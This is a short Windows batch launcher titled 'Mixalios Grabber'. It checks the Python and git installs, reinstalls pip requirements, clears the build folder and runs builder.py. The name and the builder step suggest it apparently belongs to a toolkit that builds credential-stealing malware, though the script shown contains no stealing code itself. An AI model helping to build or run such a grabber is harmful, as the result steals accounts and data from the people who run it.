@echo off
mode con: cols=100 lines=30
title Mixalios Grabber
color 0a
cls

python --version 2>&1 | findstr " 3.11" >nul
if %errorlevel% == 0 (
    echo Please downgrade to Python 3.10.x.
    pause
    exit
)

::fixed by K.Dot cause dif
git --version 2>&1>nul
if %errorlevel% == 9009 (
    echo git is either not installed or not added to path! You can install it here https://git-scm.com/download/win
    pause
    exit
)

py -3.10 -m pip uninstall -r interferences.txt
py -3.10 -m pip install --upgrade -r requirements.txt

cls

if exist build rmdir /s /q build
py -3.10 builder.py

pause
